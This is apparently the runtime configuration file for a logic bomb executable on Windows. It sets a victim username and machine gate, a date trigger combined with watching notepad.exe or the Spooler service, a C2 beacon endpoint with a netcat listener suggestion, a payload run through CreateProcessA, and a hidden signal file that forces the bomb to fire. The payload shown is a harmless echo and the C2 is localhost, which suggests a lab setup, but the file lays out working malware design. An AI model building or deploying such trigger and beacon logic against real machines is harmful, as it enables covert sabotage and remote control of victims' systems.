# ─────────────────────────────────────────────────────────────────────────────
# lb_config.ini
# Runtime configuration for logic_bomb.exe
# Parsed at startup by config_load() in logic_bomb.c
# Format  : key=value
# Comments: lines beginning with #
# Encoding: ANSI (no BOM, no UTF-8 — matches ANSI WinAPI calls in the binary)
#
# GOTCHA: key names are case-sensitive. Match exactly as listed below.
#         Trailing spaces after value are trimmed by config_load().
#         Missing keys fall back to compile-time defines in logic_bomb.c.
# ─────────────────────────────────────────────────────────────────────────────

# ── Environment gate ─────────────────────────────────────────────────────────
# Both must match for the bomb to arm.
# Compared with _stricmp (case-insensitive).
target_user=VICTIM
target_machine=DESKTOP-TARGET

# ── Process / service detection ───────────────────────────────────────────────
# watch_process : .exe name as it appears in Task Manager
# (service name is hardcoded in logic_bomb.c as WATCH_SERVICE = "Spooler")
watch_process=notepad.exe

# ── Date trigger ─────────────────────────────────────────────────────────────
# Fire on or after this local calendar date.
# Combined condition: date AND (watch_process OR Spooler running)
trigger_year=2025
trigger_month=1
trigger_day=1

# ── C2 beacon ────────────────────────────────────────────────────────────────
# TCP endpoint that receives ARMED / TRIGGERED / ENV_MISMATCH events.
# Set to your listener (e.g. nc -lvp 4444).
c2_host=127.0.0.1
c2_port=4444

# ── Payload process ───────────────────────────────────────────────────────────
# Launched via CreateProcessA on trigger.
# payload_args is passed as the command-line argument string.
payload=cmd.exe
payload_args=/c echo triggered >> C:\ProgramData\lb.log

# ─────────────────────────────────────────────────────────────────────────────
# Signal file override (hardcoded path in logic_bomb.c):
#   C:\ProgramData\.lb_trigger
# Create this file to force-fire regardless of date/process conditions.
# Delete it to disarm the override.
# Not configurable here — change SIGNAL_FILE define in logic_bomb.c to move it.
# ─────────────────────────────────────────────────────────────────────────────